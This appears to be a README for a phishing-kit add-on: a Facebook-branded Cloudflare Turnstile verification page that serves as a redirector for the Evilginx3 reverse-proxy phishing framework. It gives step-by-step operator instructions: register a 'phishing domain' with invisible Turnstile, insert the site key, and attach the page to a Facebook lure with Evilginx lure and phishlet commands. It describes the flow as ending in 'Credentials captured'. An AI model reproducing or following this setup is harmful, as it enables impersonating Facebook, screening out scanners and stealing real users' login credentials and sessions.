# Facebook Turnstile Redirector

Facebook-branded Cloudflare Turnstile verification page for Evilginx3.

## Quick Setup

### 1. Create Turnstile Site
- Go to [Cloudflare Turnstile](https://dash.cloudflare.com/?to=/:account/turnstile)
- Add site with your phishing domain
- Set Widget Mode to **"Invisible"**
- Copy the Site Key

### 2. Configure Redirector
- Open `index.html`
- Replace `'YOUR_TURNSTILE_SITE_KEY'` with your Site Key (line ~209)
- Save file

### 3. Use with Lure
```bash
# Create lure
lures create facebook

# Set redirector (replace <id> with lure ID)
lures edit <id> redirector facebook_turnstile

# Get URL
lures get-url <id>
```

## How It Works

User visits lure → Facebook verification page → Turnstile verifies → Redirects to phishing page → Credentials captured

## Troubleshooting

- Check redirector is set: `lures` command
- Verify Site Key in `index.html` matches Cloudflare
- Ensure phishlet is enabled: `phishlets enable facebook`
